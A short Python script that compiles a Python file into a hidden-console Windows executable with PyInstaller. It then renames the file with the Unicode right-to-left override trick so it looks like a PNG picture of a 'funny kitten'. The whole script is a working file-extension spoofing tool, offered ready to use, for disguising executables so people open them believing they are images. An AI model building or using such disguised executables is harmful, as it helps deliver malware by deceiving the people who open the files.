import os
import shutil
import subprocess


# ---=== Settings ===--- #
source_py = "open_calc.py"        # name of your .py script
icon_path = None                  # you can specify the .ico icon or fill in None
display_name = "смешной котик х"  # what do you want to name the masking file


# ---===  .py in .exe ===--- #
pyi_cmd = ["pyinstaller", "--onefile", "--noconsole"]

if icon_path:
    pyi_cmd += ["--icon", icon_path]

pyi_cmd.append(source_py)

print("📦 Створення .exe через PyInstaller...")
subprocess.run(pyi_cmd, check=True)


# === Disguise RLO === #
rlo = "\u202e"
fake_ext = "gnp"  
fake_name = f"{display_name}{rlo}{fake_ext}.exe"

dist_folder = "dist"
build_folder = "build"
spec_file = source_py.replace(".py", ".spec")
real_exe = os.path.join(dist_folder, source_py.replace(".py", ".exe"))

new_exe_path = os.path.join(".", fake_name)
shutil.move(real_exe, new_exe_path)

shutil.rmtree(build_folder)
shutil.rmtree(dist_folder)
if os.path.exists(spec_file):
    os.remove(spec_file)

print(f"all was good: {fake_name}")
